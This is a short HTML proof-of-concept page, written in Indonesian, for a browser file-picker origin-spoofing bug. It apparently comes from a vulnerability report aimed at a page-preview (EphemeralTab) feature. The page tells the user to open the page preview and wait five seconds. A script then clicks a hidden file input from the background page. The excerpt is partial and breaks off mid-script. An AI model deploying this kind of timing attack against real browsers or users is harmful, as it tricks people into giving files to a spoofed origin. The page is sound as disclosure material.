    <h2>PoC: File Picker Origin Spoofing</h2>

    <p>2. Pilih menu <b>"Preview page" (Pratinjau halaman)</b>.</p>
    <p>3. Tunggu 5 detik saat pratinjau halaman terbuka.</p>

    <br>
    <!-- Tautan untuk memicu EphemeralTab -->

    <!-- Input file tersembunyi -->

    <script>
        // Simulasi race condition / timing attack dari tab latar belakang
        setTimeout(() => {
            console.log("Triggering file picker from background page...");
            const fileInput = document.getElementById('fileInput');
            
            // Mengaktifkan dialog file picker secara otomatis
            fileInput.click();
        }, 5000);
